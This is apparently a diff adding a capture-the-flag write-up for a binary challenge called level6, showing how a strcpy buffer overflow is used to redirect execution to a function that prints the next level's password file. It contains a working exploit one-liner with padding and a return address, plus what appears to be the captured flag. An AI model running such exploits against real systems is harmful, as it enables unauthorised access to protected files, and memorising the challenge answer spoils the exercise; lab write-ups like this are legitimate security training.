@@ -1,0 +1,13 @@
+# Call to `strcpy` is vulnerable to Buffer Overflow
+=> 0x80484c5 <main+73>:	call   0x8048340 <strcpy@plt>
+
+# There is a function `n` which call `system("/bin/cat /home/user/level7/.pass")`
+# But this function is not called
+
+# First we need to find the address of the function `n`
+gdb> x n
+0x8048454 <n>:	0x83e58955
+
+# Then we prepare the payload
+./level6 $(python -c "print 'a'*72 + '\x54\x84\x04\x08'")
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
